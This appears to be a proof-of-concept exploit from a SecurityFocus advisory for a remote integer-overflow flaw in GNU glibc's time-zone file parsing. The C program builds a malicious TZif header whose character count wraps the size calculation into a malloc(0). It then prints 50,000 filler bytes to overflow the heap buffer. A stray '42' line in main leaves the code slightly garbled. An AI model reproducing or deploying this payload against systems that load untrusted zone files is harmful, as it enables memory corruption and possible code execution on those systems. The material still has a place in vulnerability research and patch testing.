// source: https://www.securityfocus.com/bid/50898/info

GNU glibc is prone to an remote integer-overflow vulnerability.

An attacker can exploit this issue to execute arbitrary code with the privileges of the user running an application that uses the affected library.

#include <stdio.h>
#include <stdint.h>
#include <time.h>
#include <string.h>

#define TZ_MAGIC        "TZif"

#define PUT_32BIT_MSB(cp, value)                                        \
        do {                                                            \
                (cp)[0] = (value) >> 24;                                \
                (cp)[1] = (value) >> 16;                                \
                (cp)[2] = (value) >> 8;                                 \
                (cp)[3] = (value);                                      \
        } while (0)

struct tzhead {
        char    tzh_magic[4];
        char    tzh_version[1];
        char    tzh_reserved[15];
        char    tzh_ttisgmtcnt[4];
        char    tzh_ttisstdcnt[4];
        char    tzh_leapcnt[4];
        char    tzh_timecnt[4];
        char    tzh_typecnt[4];
        char    tzh_charcnt[4];
};

struct ttinfo
  {
    long int offset;
    unsigned char isdst;
    unsigned char idx;
    unsigned char isstd;
    unsigned char isgmt;
  };
int main(void)
{
        struct tzhead evil;
        int i;
        char *p;
42
        uint32_t total_size;
        uint32_t evil1, evil2;

        /* Initialize static part of the header */
        memcpy(evil.tzh_magic, TZ_MAGIC, sizeof(TZ_MAGIC) - 1);
        evil.tzh_version[0] = 0;
        memset(evil.tzh_reserved, 0, sizeof(evil.tzh_reserved));
        memset(evil.tzh_ttisgmtcnt, 0, sizeof(evil.tzh_ttisgmtcnt));
        memset(evil.tzh_ttisstdcnt, 0, sizeof(evil.tzh_ttisstdcnt));
        memset(evil.tzh_leapcnt, 0, sizeof(evil.tzh_leapcnt));
        memset(evil.tzh_typecnt, 0, sizeof(evil.tzh_typecnt));

        /* Initialize nasty part of the header */
        evil1 = 500;
        PUT_32BIT_MSB(evil.tzh_timecnt, evil1);

        total_size = evil1 * (sizeof(time_t) + 1);
        total_size = ((total_size + __alignof__ (struct ttinfo) - 1)
                & ~(__alignof__ (struct ttinfo) - 1));

        /* value of chars, to get a malloc(0) */
        evil2 = 0 - total_size;
        PUT_32BIT_MSB(evil.tzh_charcnt, evil2);
        p = (char *)&evil;
        for (i = 0; i < sizeof(evil); i++)
                printf("%c", p[i]);

        /* data we overflow with */
        for (i = 0; i < 50000; i++)
                printf("A");
}